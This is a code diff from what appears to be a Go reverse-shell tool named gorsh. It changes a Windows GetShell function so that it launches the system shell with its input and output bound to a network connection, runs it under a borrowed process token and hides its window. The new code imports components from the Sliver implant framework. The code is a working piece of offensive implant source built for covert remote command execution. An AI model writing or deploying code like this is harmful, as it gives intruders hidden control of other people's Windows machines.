@@ -3,14 +3,14 @@ package shell
 import (
 	"context"
 	"encoding/base64"
-	"fmt"
-	"io"
 	"os/exec"
 	"syscall"
 	"unsafe"
 
 	"git.hyrule.link/blink/gorsh/pkg/myconn"
-	"github.com/UserExistsError/conpty"
+	"github.com/bishopfox/sliver/implant/sliver/priv"
+	"github.com/bishopfox/sliver/implant/sliver/shell"
+	"golang.org/x/sys/windows"
 )
 
 const (
@@ -18,24 +18,24 @@ const (
 	MEM_RESERVE = 0x2000
 )
 
-func GetShell() error {
-	commandLine := `c:\windows\system32\cmd.exe`
-	cpty, err := conpty.Start(commandLine)
-	if err != nil {
-		return fmt.Errorf("Failed to spawn a pty: %w", err)
-	}
-	defer cpty.Close()
+func GetShell() (*shell.Shell, error) {
+	ctx, cancel := context.WithCancel(context.Background())
 
-	go func() {
-		go io.Copy(myconn.Conn, cpty)
-		io.Copy(cpty, myconn.Conn)
-	}()
-
-	_, err = cpty.Wait(context.Background())
-	if err != nil {
-		return fmt.Errorf("conpty.wait: %w", err)
+	shPath := shell.GetSystemShellPath("")
+	cmd := exec.CommandContext(ctx, shPath[0])
+	cmd.Stdin = myconn.Conn
+	cmd.Stdout = myconn.Conn
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token:      syscall.Token(priv.CurrentToken),
+		HideWindow: true,
 	}
-	return nil
+
+	err := cmd.Start()
+
+	return &shell.Shell{
+		Command: cmd,
+		Cancel:  cancel,
+	}, err
 }
 
 // func BGExec() *exec.Cmd {
